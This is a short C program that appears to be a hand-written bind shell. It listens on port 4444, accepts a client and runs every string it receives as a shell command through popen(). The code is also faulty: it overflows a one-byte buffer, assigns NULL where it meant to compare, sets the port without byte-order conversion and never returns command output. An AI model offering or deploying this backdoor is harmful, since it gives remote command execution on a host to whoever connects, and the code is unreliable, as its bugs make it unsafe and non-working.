#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define MAXSIZE 1024

void exchange (int client_socket){

	char buffer[MAXSIZE];
	char string_msg[] = "";
	FILE *output;

	// Loop for exchange between Client & Server
	while(1){

		bzero(buffer,MAXSIZE);

		// Read and convert the socket from the client
		int bytes_of_socket = recv(client_socket, buffer, sizeof(buffer),0);
		strncpy(string_msg, buffer, bytes_of_socket);
		string_msg[bytes_of_socket] = '\0';

		// Execute Linux command & create an output of this command
		output = popen (string_msg, "r");
		if (output = NULL){
			printf("Failed to run command, try again ! \n");
			exit(1);
		}
	}
}

int main() {

	//Configuration of IP address & port number
	char *ip = "127.0.0.1";
	int port = 4444;

	int n;

	int server_socket, client_socket;

	struct sockaddr_in server_addr, client_addr;
	socklen_t addr_size;
	
	server_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (server_socket < 0){
		perror ("[-] Socket error");
		exit (1);
	}

	memset(&server_addr, '\0', sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = port;
	server_addr.sin_addr.s_addr = inet_addr(ip);

	printf("[+] Server started. \n");

	n = bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));
	if (n < 0){
		perror("[-] Bind error");
		exit(1);
	}
	printf("[+] Bind to the port number: %d \n", port);

	listen(server_socket,5); 
	printf("listening... \n");

	addr_size = sizeof(client_addr);
	client_socket = accept(server_socket, (struct sockaddr*)&client_addr,&addr_size);
	printf("[+] Client connected !\n");
	
	exchange(client_socket);

	return 0;
}